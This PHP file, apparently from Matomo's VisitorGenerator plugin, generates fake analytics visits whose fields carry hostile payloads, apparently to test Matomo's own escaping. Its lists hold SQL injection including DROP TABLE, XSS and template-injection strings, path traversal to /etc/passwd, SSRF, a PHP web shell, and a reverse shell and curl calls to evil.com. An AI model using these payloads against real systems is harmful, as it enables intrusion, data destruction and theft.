<?php

/**
 * Matomo - free/libre analytics platform
 *
 * @link https://matomo.org
 * @license http://www.gnu.org/licenses/gpl-3.0.html GPL v3 or later
 *
 */

namespace Piwik\Plugins\VisitorGenerator\Generator;

use Piwik\Piwik;
use Piwik\Plugin\Manager;
use Piwik\Plugins\CoreAdminHome\API as CoreAdminHomeApi;
use Piwik\Plugins\SitesManager\API as SitesManagerApi;
use Piwik\Plugins\VisitorGenerator\Generator;

class VisitsMalicious extends Generator
{
    private $sqlPayloads = [
        "' OR '1'='1' --",  // Classic SQLi for PHP/MySQL
        "' OR 1=1#",
        "' UNION SELECT NULL, @@version, CURRENT_USER --",
        "'; DROP TABLE users; --",
        "' AND IF(1=1, SLEEP(5), 0) --",  // Time-based for PHP apps
        "'; EXEC xp_cmdshell('dir'); --",  // If MSSQL with PHP
        "admin' --",
        "1; WAITFOR DELAY '0:0:5' --",
        "') OR ('1'='1' --",
        "' UNION SELECT LOAD_FILE('/etc/passwd') --",
        "%27 OR 1=1 --",
        "' OR ''='",
        "1' OR '1'='1",
        "' UNION SELECT 1, DATABASE(), 3 --",
        "'; SELECT BENCHMARK(10000000,MD5(1)); --",
        "' AND 1=0 UNION SELECT @@version --",
        "1'; EXECUTE IMMEDIATE 'SEL' || 'ECT * FROM users'; --",  // Oracle-style, if applicable
        "' OR 1=1 LIMIT 1 --",
        "admin')--",
        "' HAVING 1=1 --",
        "' GROUP BY 1 HAVING 1=1--",
        "') UNION SELECT NULL, NULL --",
        "'; DECLARE @x VARCHAR(99); SET @x='dir'; EXEC master..xp_cmdshell @x; --",
        "' AND (SELECT 1 FROM (SELECT SLEEP(5))A)--",
        "1 AND 1=0 UNION ALL SELECT 'admin', MD5('password')",
        "' OR EXISTS(SELECT * FROM dual WHERE DATABASE() LIKE '%')--",
        "admin' AND 1=0 UNION ALL SELECT NULL, table_name FROM information_schema.tables--",
        "' OR 1=1 /*",
        "') OR ('a'='a",
        "')) OR (('1'='1",
        "'/**/OR/**/1=1--",  // Comment bypass for PHP filters
        "1' ORDER BY 1--",  // Column enumeration
        "1' UNION SELECT IF(SUBSTRING(current_user(),1,1)='r',SLEEP(5),1)--",  // Blind extraction
        "' AND ASCII(SUBSTRING((SELECT @@version),1,1))>64 --",
    ];

    private $scriptPayloads = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert(1)>",
        "\"><svg/onload=confirm(document.cookie)>",
        "<svg><script>alert('xss')</script>",
        "`); alert(1); (`",
        "javascript:alert(document.domain)",
        "data:text/html,<script>alert('x')</script>",
        "<body onfocus=print()>",
        "<iframe src=javascript:alert('xss')>",
        "<math href=\"javascript:alert(1)\">",
        "&lt;script&gt;alert('xss')&lt;/script&gt;",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        // jQuery-specific
        "#\"><img src=x onerror=alert(1)>",  // For jQuery selector sinks
        "');alert(1);//",  // For script tags in jQuery.html()
        "<div id=\"x\"><script>alert(1)</script></div>",  // If using jQuery.append()
        // jQuery UI specific
        "<div title=\"<img src=x onerror=alert(1)>\">",  // For tooltip or dialog in jQuery UI
        "<button><img src=x onerror=alert(1)></button>",  // Checkboxradio widget XSS
        // Vue.js 3 specific
        "{{ constructor.constructor('alert(1)')() }}",
        "{{ \$emit('xss', alert(1)) }}",
        "<div v-html=\"'<script>alert(1)</script>'\"></div>",
        "{{ alert(1) }}",
        "javascript:alert(1)//",
        "{{ _c('img',{attrs:{src:'x',onerror:'alert(1)'}}) }}",  // Vue render function
        "<template><div @click=\"alert(1)\">Click</div></template>",
        "{{ this.\$nextTick(() => alert(1)) }}",
        "<img :src=\"'x'\" onerror=\"alert(1)\">",
        "v-bind:href=\"'javascript:alert(1)'\"",
        "{{ []._proto_.push(alert(1)) }}",  // Prototype pollution attempt
    ];

    private $templatePayloads = [
        // Twig-specific SSTI
        '{{ 7*7 }}',  // Basic expression test
        '{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}',  // RCE via filter
        '{{ app.request.server.get("SERVER_NAME") }}',  // Expose server info
        '{{ include("/etc/passwd") }}',  // File inclusion
        '{{ dump(_context) }}',  // Dump variables
        '{{ config("app.debug") }}',  // If Symfony/Twig
        '{% for key, value in _self.env.globals %}{{ key }}: {{ value }}{% endfor %}',  // Globals dump
        '{{ _self.env.getFilter("system")("id") }}',  // If filter bypass
        '{% set cmd = "id" %}{{ app.request.server.get("PATH_TRANSLATED")|split("/")|last|slice(0,-9)|join("/") ~ "/bin/sh -c " ~ cmd|system }}',  // Complex RCE
        '{{ [].class.base.subclasses() }}',  // Class exploration
        '{{ constant("PHP_OS") }}',
        '{% debug %}',  // Debug mode
        '{{ app.request.query.all|join }}',
        '{{ _self.env.getTemplate("../../../../etc/passwd").render() }}',  // Path traversal
        '{{ craft.requests.getPost("cmd")|exec }}',  // If filters allow
        '{% import _self as tf %}{% macro a(x="id") %}{{ tf.env.getFilter("passthru")(x) }}{% endmacro %}{{ tf.a() }}',
        '{{ settings.security.csrf_secret }}',  // Expose secrets
        '{{ joiner.__init__.__globals__.os.popen("id").read() }}',  // Via builtins
        '{{ cycler.__init__.__globals__.os.popen("id").read() }}',
        '{{ lipsum.__globals__.os.popen("id").read() }}',
        '{{ range.constructor("return globals()")().eval("__import__(\'os\').popen(\'id\').read()") }}',
        // Vue.js template-like, but since Twig is primary
        '{{ this.$parent.$parent.alert(1) }}',  // If mixed with Vue
    ];

    private $miscPayloads = [
        // PHP-specific
        '../etc/passwd',
        '../../../../../windows/win.ini',
        '| ls -la |',
        '$(cat /etc/passwd)',
        'file:///etc/passwd',
        'gopher://127.0.0.1:11211/_stats',
        '${jndi:ldap://evil.com/a}',  // If Java, but for PHP less relevant
        'file://c:/windows/win.ini',
        'http://169.254.169.254/latest/meta-data/',
        '<?php system($_GET["cmd"]); ?>',  // PHP shell
        '%2F..%2F..%2Fetc%2Fpasswd',
        '; cat /etc/passwd',
        '`cat /etc/passwd`',
        '&& dir',
        '|| whoami',
        '; sleep 5;',
        '1 | id',
        '../../../../../../../etc/shadow',
        '....//....//etc/passwd',
        '%00../../../../../../etc/passwd',
        'file:///proc/self/environ',
        'http://[::1]/',
        'ldap://localhost:1389/Exploit',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'expect://id',
        '\\\\evil.com\\share',
        '/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        '....\\/....\\/....\\/windows/system32/drivers/etc/hosts',
        '; curl http://evil.com',
        '$(curl http://evil.com)',
        '1; ping -c 5 127.0.0.1',
        '|| ping -c 5 127.0.0.1 ||',
        'http://127.0.0.1:8080/ssrf',
        'dict://evil.com:1337/',
        'telnet://evil.com:23',
        'ssh://evil.com',
        'c:/boot.ini',
        '%windir%\\system32\\calc.exe',
        '<!ENTITY xxe SYSTEM "file:///etc/passwd">',  // XXE if XML in PHP
        '<!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">%remote;',
        // PHP command injection specific
        '; php -r \'$sock=fsockopen("evil.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'',
        '&& php -i',
        '| php -r "echo shell_exec(\'id\');"',
        'system("id")',
        'passthru("id")',
        'exec("id")',
        'shell_exec("id")',
        '`id`',
        // For include/eval in PHP
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==',
        'php://filter/convert.base64-encode/resource=index.php',
        'expect://whoami',
        // Vue.js misc
        'v-on:click="alert(1)"',
        ':href="`javascript:alert(1)`"',
        '{{$on.constructor.prototype.bind = $on => alert(1)}}',
    ];

    private $searchReferrers = [
        'https://www.google.com/search',
        'https://www.bing.com/search',
        'https://duckduckgo.com/',
        'https://search.brave.com/search',
        'https://www.baidu.com/s',
    ];

    private $socialReferrers = [
        'https://www.facebook.com',
        'https://twitter.com',
        'https://t.co',
        'https://www.linkedin.com',
        'https://www.reddit.com/r/security',
        'https://mastodon.social',
    ];

    private $maliciousBrands = [
        '" Not A;Brand";v="99", "Chromium";v="95", "\' OR \'1\'=\'1\' --";v="13"',
        '"BadBrowser";v="105", "{{ 7*7 }}";v="1.0"',
        '"Edge";v="0", "Chrome";v="0", "Pwn";v="666"',
    ];

    public function generate($time = false, $idSite = 1, $limit = 30): int
    {
        $date = date("Y-m-d", $time);

        $tracker = $this->makeMatomoTracker($idSite);
        $tracker->setDebugStringAppend('dp=1');
        $tracker->enableBulkTracking();
        $tokenAuth = Piwik::requestTemporarySystemAuthToken('VisitorGeneratorMalicious', 24);
        $site = $this->getCurrentSite($idSite);

        $tracker->setNewVisitorId();
        if ($this->trackNonProfilable) {
            $tracker->randomVisitorId = false;
        }

        $actions = 0;
        while ($actions < $limit) {
            $countryCode = $this->faker->countryCode;

            if ($this->faker->boolean(35)) {
                $tracker->setNewVisitorId();
                if ($this->trackNonProfilable) {
                    $tracker->randomVisitorId = false;
                }
                if ($this->faker->boolean(75)) {
                    $tracker->setUserId($this->randomPayload());
                } else {
                    $tracker->setUserId(false);
                }
                $tracker->setUrlReferrer($this->buildMaliciousReferrer());

                $tracker->setUserAgent($this->buildUserAgent());

                $tracker->setAttributionInfo(json_encode([
                    $this->buildMaliciousReferrer(),
                    $this->randomPayload(),
                    $this->randomPayload(),
                    time() - $this->faker->numberBetween(1000, 50000),
                ]));
            }

            $tracker->setTokenAuth($tokenAuth);
            $tracker->setIdSite($idSite);
            $this->setMaliciousClientHints($tracker);
            $tracker->setBrowserLanguage($this->faker->randomElement(['en', 'en-US', 'de', 'fr', 'es']));
            $tracker->setCity($this->randomPayload());
            $tracker->setCountry(strtolower($countryCode));
            $tracker->setRegion($this->faker->region($countryCode));
            $tracker->setLatitude($this->faker->latitude);
            $tracker->setLongitude($this->faker->longitude);
            $tracker->setIp($this->faker->boolean(60) ? $this->faker->ipv4 : $this->faker->ipv6);
            $tracker->setLocalTime($this->faker->time('H:i:s'));
            $tracker->setForceVisitDateTime($date . ' ' . $this->faker->time('H:i:s'));
            $tracker->setUrl($this->buildMaliciousUrl($site['main_url']));

            $tracker->setCustomTrackingParameter('payload', $this->randomPayload());
            $tracker->setCustomTrackingParameter('ca', $this->randomPayload());
            $tracker->setCustomTrackingParameter('idgoal', $this->randomPayload());

            $tracker->setCustomVariable(1, $this->randomPayload(), $this->randomPayload(), 'visit');
            $tracker->setCustomVariable(2, $this->randomPayload(), $this->randomPayload(), 'visit');
            $tracker->setCustomVariable(1, $this->randomPayload(), $this->randomPayload(), 'page');
            $tracker->setCustomVariable(2, $this->randomPayload(), $this->randomPayload(), 'page');

            $tracker->setCustomDimension('1', $this->randomPayload());
            $tracker->setCustomDimension('2', $this->randomPayload());
            $tracker->setCustomDimension('3', $this->randomPayload());
            $tracker->setCustomDimension('4', $this->randomPayload());

            $pageTitle = $this->buildPageTitle();
            $tracker->doTrackPageView($pageTitle);
            $actions++;

            if ($this->faker->boolean(75)) {
                $this->setActionScopePayloads($tracker);
                $tracker->doTrackEvent( $this->randomPayload(),  $this->randomPayload(), $this->randomPayload());
                $actions++;
            }

            if ($this->faker->boolean(50)) {
                $this->setActionScopePayloads($tracker);
                $tracker->doTrackSiteSearch($this->randomPayload(), $this->randomPayload(), $this->faker->boolean(40) ? $this->faker->randomNumber(3) : $this->faker->numberBetween(0, 5));
                $actions++;
            }

            if ($this->faker->boolean(40)) {
                $this->setActionScopePayloads($tracker);
                $tracker->doTrackContentImpression($this->randomPayload(), $this->randomPayload(), $site['main_url'] . '/content?payload=' . rawurlencode($this->randomPayload()));
                if ($this->faker->boolean(60)) {
                    $this->setActionScopePayloads($tracker);
                    $tracker->doTrackContentInteraction('click', $this->randomPayload(), $this->randomPayload(), $site['main_url'] . '/content?payload=' . rawurlencode($this->randomPayload()));
                    $actions++;
                }
                $actions++;
            }

            if ($this->faker->boolean(45)) {
                $this->setActionScopePayloads($tracker);
                $tracker->doTrackAction($site['main_url'] . '/download?file=' . rawurlencode($this->randomPayload()), 'download');
                $actions++;
            }

            if ($this->faker->boolean(45)) {
                $this->setActionScopePayloads($tracker);
                $tracker->doTrackAction('https://example.com/out?to=' . rawurlencode($this->randomPayload()), 'link');
                $actions++;
            }

            if ($this->faker->boolean(30)) {
                $tracker->setEcommerceView($this->randomPayload(), $this->randomPayload(), [$this->randomPayload(), $this->randomPayload()], $this->faker->randomNumber(2));
                $tracker->addEcommerceItem($this->randomPayload(), $this->randomPayload(), [$this->randomPayload(), $this->randomPayload()], $this->faker->randomNumber(2), $this->faker->numberBetween(1, 3));
                $tracker->doTrackEcommerceOrder($this->buildOrderId($this->randomPayload(), $this->randomPayload()), $this->faker->randomNumber(3), $this->faker->randomNumber(2), $this->faker->randomNumber(2), $this->faker->randomNumber(2), $this->faker->randomNumber(2));
                if ($this->faker->boolean(60)) {
                    $this->setActionScopePayloads($tracker);
                    $tracker->doTrackEcommerceCartUpdate($this->faker->randomNumber(3));
                    $actions++;
                }
                $actions++;
            }

            if ($this->faker->boolean(25)) {
                $this->trackMaliciousMedia($tracker);
                $actions++;
            }
            if ($this->faker->boolean(30)) {
                $this->setActionScopePayloads($tracker);
                $tracker->doTrackGoal($this->faker->numberBetween(1, 5), $this->faker->randomFloat(2, 0, 50), $this->randomPayload());
                $actions++;
            }

            if ($actions % 50 === 0) {
                $tracker->doBulkTrack();
            }
        }

        if ($actions % 50 !== 0) {
            $tracker->doBulkTrack();
        }

        CoreAdminHomeApi::getInstance()->invalidateArchivedReports($idSite, $date);

        return $actions;
    }

    private function buildMaliciousUrl($baseUrl): string
    {
        $baseUrl = rtrim($baseUrl, '/');
        $campaign = $this->buildCampaignParameters();
        $query = http_build_query([
            'search' => $this->randomPayload(),
            'next' => "javascript:" . $this->randomPayload(),
            'template' => $this->randomPayload(),
            'sql' => $this->randomPayload(),
        ] + $campaign, '', '&', PHP_QUERY_RFC3986);

        return $baseUrl . '/malicious/' . rawurlencode($this->randomPayload()) . '?' . $query . '#' . rawurlencode($this->randomPayload());
    }

    private function buildMaliciousReferrer(): string
    {
        $token = $this->randomPayload();
        $type = $this->faker->randomElement(['search', 'social', 'generic', 'direct']);

        if ($type === 'search') {
            $searchBase = $this->faker->randomElement($this->searchReferrers);
            $paramSeparator = strpos($searchBase, '?') === false ? '?' : '&';
            return $searchBase . $paramSeparator . 'q=' . rawurlencode($token);
        }

        if ($type === 'social') {
            $socialBase = $this->faker->randomElement($this->socialReferrers);
            return rtrim($socialBase, '/') . '/' . rawurlencode($token);
        }

        if ($type === 'generic') {
            $base           = $this->faker->url;
            $paramSeparator = strpos($base, '?') === false ? '?' : '&';
            return $base . $paramSeparator . 'payload=' . rawurlencode($token) . '&next=' . rawurlencode($this->randomPayload());
        }

        return '';
    }

    private function buildCampaignParameters(): array
    {
        return [
            'pk_campaign' => $this->randomPayload(),
            'pk_kwd' => $this->randomPayload(),
            'utm_source' => $this->randomPayload(),
            'utm_medium' => $this->faker->randomElement(['social', 'cpc', 'email', $this->randomPayload()]),
            'utm_campaign' => $this->randomPayload(),
            'utm_term' => $this->randomPayload(),
        ];
    }

    private function buildOrderId(string $payload, string $sqlPayload): string
    {
        return substr($this->randomPayload() . '-' . $this->faker->randomNumber(5), 0, 100);
    }

    private function setMaliciousClientHints(\MatomoTracker $tracker): void
    {
        $tracker->setClientHints(
            substr($this->randomPayload(), 0, 30),
            substr($this->randomPayload(), 0, 30),
            $this->faker->randomElement(['14.0.0', '0.0.0', '9.9.9<svg']),
            $this->faker->randomElement($this->maliciousBrands),
            substr($this->randomPayload(), 0, 30),
            '"Tablet", "Automotive"'
        );
    }

    private function trackMaliciousMedia(\MatomoTracker $tracker): void
    {
        if (!Manager::getInstance()->isPluginActivated('MediaAnalytics')) {
            return; // plugin not available
        }

        $tracker->clearCustomTrackingParameters();
        $tracker->setCustomTrackingParameter(\Piwik\Plugins\MediaAnalytics\Actions\ActionMedia::PARAM_MEDIA_TITLE, $this->randomPayload());
        $tracker->setCustomTrackingParameter(\Piwik\Plugins\MediaAnalytics\Actions\ActionMedia::PARAM_RESOURCE, 'javascript:' . $this->randomPayload());
        $tracker->setCustomTrackingParameter(\Piwik\Plugins\MediaAnalytics\Actions\ActionMedia::PARAM_ID_VIEW, substr($this->randomPayload() . $this->randomPayload(), 0, 16));
        $tracker->storedTrackingActions[] = $tracker->getUrlTrackPageView($this->buildPageTitle());
        $tracker->clearCustomTrackingParameters();
    }

    private function setActionScopePayloads(\MatomoTracker $tracker): void
    {
        $tracker->setCustomVariable(3, 'sql', $this->randomPayload(), 'page');
        $tracker->setCustomVariable(4, 'js', $this->randomPayload(), 'page');
        $tracker->setCustomDimension('5', $this->randomPayload());
        $tracker->setCustomDimension('6', $this->randomPayload());
        $tracker->setCustomTrackingParameter('bad', $this->randomPayload());
    }

    private function randomPayload(): string
    {
        $pool = array_merge($this->sqlPayloads, $this->scriptPayloads, $this->templatePayloads, $this->miscPayloads);

        return $this->faker->randomElement($pool);
    }

    private function buildPageTitle(): string
    {
        return sprintf(
            "%s | %s | %s",
            $this->randomPayload(),
            $this->randomPayload(),
            $this->randomPayload()
        );
    }

    private function buildUserAgent(): string
    {
        if ($this->faker->boolean(10)) {
            return $this->faker->userAgent;
        }

        if ($this->faker->boolean(35)) {
            return $this->randomPayload() . '/46.3.30 (iPad; iOS 15.0.2; Scale/2.00)';
        }

        $base = 'VisitorGeneratorMalicious/1.0';
        $choice = $this->randomPayload();
        $suffix = substr($this->randomPayload() . ' ' . $this->randomPayload() . ' ' . $choice, 0, 140);

        return trim($base . ' ' . $suffix);
    }

    private function getCurrentSite($idSite): array
    {
        return SitesManagerApi::getInstance()->getSiteFromId($idSite);
    }
}
